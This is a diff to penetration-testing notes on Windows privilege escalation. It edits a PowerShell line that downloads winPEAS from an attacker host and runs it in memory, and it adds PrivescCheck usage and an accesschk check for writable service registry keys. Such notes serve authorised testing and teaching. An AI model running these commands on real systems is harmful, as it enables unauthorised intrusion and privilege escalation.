@@ -22,8 +22,14 @@ Run a ton of checks.
 
 === "[[notes/tools/winpeas]]"
     ~~~ powershell
-    $a=[System.Reflection.Assembly]::Load([byte[]](iwr -useb 'http://attacker.corp.local/winpeas-x64.exe' | Select-Object -ExpandProperty Content))
+    $a=[System.Reflection.Assembly]::Load([byte[]](iwr -useb 'http://attacker.corp.local/winpeas.exe' | Select-Object -ExpandProperty Content))
     [winPEAS.Program]::Main('wait')
+    ~~~
+
+=== "[[notes/tools/privesccheck]]"
+    ~~~ ps1
+    import-module .\PrivescCheck.ps1
+    Invoke-PrivescCheck
     ~~~
 
 Test if credentials are valid.
@@ -170,6 +176,14 @@ If you have `SeShutdownPrivilege` reboot the system, otherwise wait for the serv
 
 ~~~ bat
 shutdown.exe /r /t 0
+~~~
+
+## Writable Service Registry Keys
+
+User can modify registry keys of a service ([source](http://web.archive.org/web/20231004130556/https://0xdf.gitlab.io/2020/04/25/htb-control.html))
+
+~~~ bat
+accesschk.exe %USERNAME% -kwsu HKLM\System\CurrentControlSet\Services
 ~~~
 
 # Always Install Elevated
